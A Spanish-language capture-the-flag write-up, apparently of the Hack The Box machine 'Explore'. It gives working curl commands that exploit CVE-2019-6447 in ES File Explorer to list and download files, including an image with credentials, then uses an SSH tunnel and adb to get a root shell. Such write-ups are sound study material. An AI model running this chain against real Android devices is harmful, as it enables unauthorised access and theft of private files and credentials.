---
title: "Explore"
date: 2022-08-28T20:58:19-05:00
description: ""
type: "post"
tags: ["htb","writeups"]
---
He regresado por la revancha
- puerto 2222 ssh
- puerto 42135 ES File Explorer
- puerto 42935 unknown
- puerto 59777 Bukkit

Al tener expuesto el puerto 59777 se sabe que es vulnerable la versión de ES File Explorer al CVE-2019-6447.

Podemos enviar peticiones al puerto 59777 con un comando a ejecutar por medio de json, por ejemplo:

```BASH
curl http://$TARGET:59777/ -d "{'command':listFiles}"
```

Los comandos aceptados son los siguientes:
- listFiles         
- listPics          
- listVideos        
- listAudios        
- listApps          
- listAppsSystem    
- listAppsPhone     
- listAppsSdcard    
- listAppsAll                 
- getDeviceInfo 

Listando las imagenes encontramos una llamada `creds.jpg`
```JSON
{
    {
    "name":"creds.jpg",
    "time":"4/21/21 02:38:18 AM",
    "location":"/storage/emulated/0/DCIM/creds.jpg", 
    "size":"1.14 MB (1,200,401 Bytes)"
    }
}
```
Para obtener la imagen simplemente hacemos una petición GET al path completo de la imagen.
```BASH
curl http://$TARGET:59777/storage/emulated/0/DCIM/creds.jpg -o creds.jpg
```

La imagen contiene credenciales, las cuales probamos para conectarnos por medio de SSH.

Si no se puede establecer la conexión modificar el archivo `~/.ssh/config` con lo siguiente
```
host 10.10.10.247
    HostkeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
```
Observando los puertos disponibles encontramos el puerto 5555, correspondiente al debugger en android, entonces podemos hacer un tunnel a tráves de ssh para así interactuar con la herramienta adecuada.

```BASH
ssh kristi@10.10.10.247 -p 2222 -L 5555:localhost:5555
```

Ya en nuestro terminal podemos conectarnos mediante adb
```BASH
adb connect <IP>
adb root # Intentamos escalar a root
adb shell
```

La flag la encontramos en el directorio `/data`

## Referencia
[Port 5555 - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/5555-android-debug-bridge)
